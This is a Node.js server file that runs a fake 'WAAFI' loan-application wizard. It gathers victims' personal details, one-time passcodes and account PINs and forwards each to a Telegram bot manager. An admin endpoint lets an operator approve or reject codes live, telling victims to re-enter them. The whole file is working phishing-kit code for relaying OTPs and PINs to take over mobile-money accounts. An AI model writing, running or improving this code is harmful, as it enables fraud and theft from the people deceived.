const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const axios = require('axios');

app.use(express.json());

// Memory store to keep track of active user wizard sessions
const activeSessions = new Map();

// URL where bot_manager.js is running
const BOT_MANAGER_URL = 'http://localhost:3001';

io.on('connection', (socket) => {
    // Generate a clean Waafi tracking ID sequence
    const appId = 'WAAFI-' + Math.floor(100000 + Math.random() * 900000);
    
    activeSessions.set(socket.id, {
        appId: appId,
        socketId: socket.id,
        loanType: '', amount: 1200, term: '1', purpose: '',
        firstName: '', lastName: '', email: '', phone: '',
        employment: '', income: '', employer: '',
        otpToken: '', pinCode: '',
        step: 1
    });

    // Send the tracking ID immediately to the browser layout
    socket.emit('session-ready', { appId: appId });
    socket.join(appId);

    // Sync multi-turn data state buffers
    socket.on('step1', (payload) => {
        let session = activeSessions.get(socket.id);
        if (session) { session = { ...session, ...payload, step: 2 }; activeSessions.set(socket.id, session); }
    });

    socket.on('step2', (payload) => {
        let session = activeSessions.get(socket.id);
        if (session) { session = { ...session, ...payload, step: 3 }; activeSessions.set(socket.id, session); }
    });

    // Step 3 submission: Forwards data to bot manager to post ONE clean layout to Telegram
    socket.on('step3-data', async (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;
        
        Object.assign(session, payload);
        session.step = 4;
        activeSessions.set(socket.id, session);

        // Forward safely to bot manager
        try {
            await axios.post(`${BOT_MANAGER_URL}/trigger-step3-telegram`, { session });
        } catch (err) {
            console.error("Communication error reaching Bot Manager (Step 3):", err.message);
        }
    });

    // Step 4 OTP: Triggers ONLY when the user types the token and clicks send
    socket.on('step4-otp', async (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;

        session.otpToken = payload.otp;
        activeSessions.set(socket.id, session);

        try {
            await axios.post(`${BOT_MANAGER_URL}/trigger-step4-telegram`, { session });
        } catch (err) {
            console.error("Communication error reaching Bot Manager (Step 4):", err.message);
        }
    });

    // Step 5 Account PIN: Transmits parameters to admin channels for final validation
    socket.on('step5-pin', async (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;

        session.pinCode = payload.pin;
        activeSessions.set(socket.id, session);

        try {
            await axios.post(`${BOT_MANAGER_URL}/trigger-step5-telegram`, { session });
        } catch (err) {
            console.error("Communication error reaching Bot Manager (Step 5):", err.message);
        }
    });

    socket.on('disconnect', () => {
        activeSessions.delete(socket.id);
    });
});

// =========================================================================
// API ENDPOINTS FOR BOT_MANAGER.JS TO UPDATE WEB APPLICATION VIEWS
// =========================================================================

app.post('/api/admin-action', (req, res) => {
    const { actionSignal, targetAppId, message } = req.body;
    
    // Find the socket session linked to this tracking ID
    let targetSession = null;
    for (let [socketId, record] of activeSessions.entries()) {
        if (record.appId === targetAppId) { targetSession = record; break; }
    }

    if (!targetSession) {
        return res.status(404).json({ error: "Active browser session not found" });
    }

    const clientSocket = io.sockets.sockets.get(targetSession.socketId);
    if (!clientSocket) {
        return res.status(410).json({ error: "Client disconnected from socket pipeline" });
    }

    // Direct routing maps matching your exact client events
    if (actionSignal === 'approve_data' || actionSignal === 'approve_otp') {
        clientSocket.emit('admin-approve-otp'); 
    } else if (actionSignal === 'reject_app') {
        clientSocket.emit('admin-reject', { message: message || "Codsigaaga waa la diiday." });
    } else if (actionSignal === 'otp-failed') {
        clientSocket.emit('otp-failed', { message: message || "Code-ka OTP ee aad gelisay waa khalad." });
    } else if (actionSignal === 'approve_pin') {
        const generatedRef = 'WAAFI-' + Math.floor(100000 + Math.random() * 900000);
        clientSocket.emit('pin-verified', { referenceId: generatedRef });
    } else if (actionSignal === 'pin-failed') {
        clientSocket.emit('pin-failed', { message: message || "PIN-ka koontada aad gelisay waa khalad." });
    }

    return res.json({ success: true });
});

http.listen(3000, () => {
    console.log('Web Application Core running on port 3000');
});